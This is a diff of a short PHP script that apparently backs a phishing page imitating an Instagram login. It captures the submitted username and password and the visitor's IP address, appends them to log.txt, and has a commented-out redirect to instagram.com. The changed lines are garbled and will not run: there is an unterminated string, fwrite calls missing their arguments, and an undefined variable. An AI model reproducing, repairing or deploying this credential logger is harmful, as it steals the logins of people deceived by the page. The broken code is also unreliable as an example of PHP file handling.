@@ -2,14 +2,12 @@
 @$ad=$_POST["kullaniciadi"];
 @$sifre=$_POST["sifre"];
 @$ip = getenv('REMOTE_ADDR');
-@$tarih = date("Y/m/d h:i:s");
 if($_POST){
 
-$yaz=fopen("log.txt","a");
-$icerik="Kullanıcı adı :".$ad."\r\n";
-$icerik="pass :".$pass."\r\n";
-fwrite($dosya, "IP       : " . $ip . "\r\n");
-fwrite($yaz,$icerik);
+$yaz=fopen("log.txt","
+fwrite($yaz); "user :".$ad   ."\r\n";
+fwrite($yaz); "pass :".$sifre."sifre;
+fwrite($yaz); "IP   :".$ip   ."\r\n");
  
 fclose($yaz);
 //	header("location:http://www.instagram.com");
